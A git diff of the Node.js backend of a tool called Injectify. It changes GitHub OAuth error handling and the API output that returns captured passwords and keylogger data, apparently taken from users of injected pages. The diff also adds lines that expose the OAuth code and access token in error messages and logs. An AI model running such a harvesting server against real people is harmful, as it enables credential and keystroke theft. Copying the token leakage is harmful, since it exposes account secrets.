@@ -28,6 +28,10 @@ const ObfuscateJS	= require('js-obfuscator')
 
 console.log(chalk.greenBright("[Injectify] ") + "listening on port " + config.express)
 
+process.on('unhandledRejection', (reason, p) => {
+	console.log(chalk.redBright("[Promise] ") + ' Unhandled Rejection at:', p, chalk.redBright('\nREASON:'), reason)
+})
+
 MongoClient.connect(config.mongodb, function(err, db) {
 	if (err) throw err
 	function getIP(ip) {
@@ -41,31 +45,35 @@ MongoClient.connect(config.mongodb, function(err, db) {
 			refresh
 		var getToken = code => {
 			return new Promise((resolve, reject) => {
-				request({
-					url: 'https://github.com/login/oauth/access_token',
-					method: 'POST',
-					headers: {
-						'Accept': 'application/json'
-					},
-					qs: {
-						'client_id': config.github.client_id,
-						'client_secret': config.github.client_secret,
-						'code': code
-					}
-				}, (error, response, github) => {
-					try {
-						github = JSON.parse(github)
-					} catch(e) {
-						console.log(chalk.redBright("[websocket] ") + chalk.yellowBright("failed to retrieve token "), github);
-						console.error(e)
-						reject(Error("Failed to parse GitHub response"))
-					}
-					if (!error && response.statusCode == 200 && github.access_token) {
-						resolve(github.access_token)
-					} else {
-						reject(Error("Failed to authenticate account, invalid code"))
-					}
-				})
+				if (!code) {
+					reject(Error("Failed to authenticate account, null code"))
+				} else {
+					request({
+						url: 'https://github.com/login/oauth/access_token',
+						method: 'POST',
+						headers: {
+							'Accept': 'application/json'
+						},
+						qs: {
+							'client_id': config.github.client_id,
+							'client_secret': config.github.client_secret,
+							'code': code
+						}
+					}, (error, response, github) => {
+						try {
+							github = JSON.parse(github)
+						} catch(e) {
+							console.log(chalk.redBright("[websocket] ") + chalk.yellowBright("failed to retrieve token "), github);
+							console.error(e)
+							reject(Error("Failed to parse GitHub response"))
+						}
+						if (!error && response.statusCode == 200 && github.access_token) {
+							resolve(github.access_token)
+						} else {
+							reject(Error("Failed to authenticate account, invalid code => " + code))
+						}
+					})
+				}
 			})
 		}
 		var getUser = token => {
@@ -91,9 +99,11 @@ MongoClient.connect(config.mongodb, function(err, db) {
 					if (!error && response.statusCode == 200 && user.login) {
 						resolve(user)
 					} else {
+						console.log(error, response.statusCode, user.login)
 						reject({
 							title	: "Could not authenticate you",
-							message	: "GitHub API rejected token!"
+							message	: "GitHub API rejected token!",
+							token	: token
 						})
 					}
 				})
@@ -309,21 +319,21 @@ MongoClient.connect(config.mongodb, function(err, db) {
 							console.log(chalk.redBright("[database] "), error);
 							socket.emit('database:registration', {
 								success: false,
-								message: error.toString()
+								message: error
 							})
 						})
 					}).catch(error => {
 						console.log(chalk.redBright("[auth:github] "), error.message);
 						socket.emit('err', {
-							title	: error.title.toString(),
-							message	: error.message.toString()
+							title	: error.title,
+							message	: error.message
 						})
 					})
 				}).catch(error => {
 					console.log(chalk.redBright("[auth:github] "), error.message);
 					socket.emit('err', {
-						title	: error.title.toString(),
-						message	: error.message.toString()
+						title	: error.title,
+						message	: error.message
 					})
 				})
 			}
@@ -764,7 +774,11 @@ MongoClient.connect(config.mongodb, function(err, db) {
 					res.setHeader('Content-Type', 'application/json')
 				}
 				if (json.passwords && json.keylogger) {
-					json = "{" + JSON.stringify(json.passwords, null, "    ").slice(1, -1) + "},\n{" + JSON.stringify(json.keylogger, null, "    ").slice(1, -1) + "}"
+					json = {
+						passwords: json.passwords,
+						keylogger: json.keylogger
+					}
+					json = JSON.stringify(json, null, "    ")
 					res.send(json)
 					console.log(
 						chalk.greenBright("[API] ") +
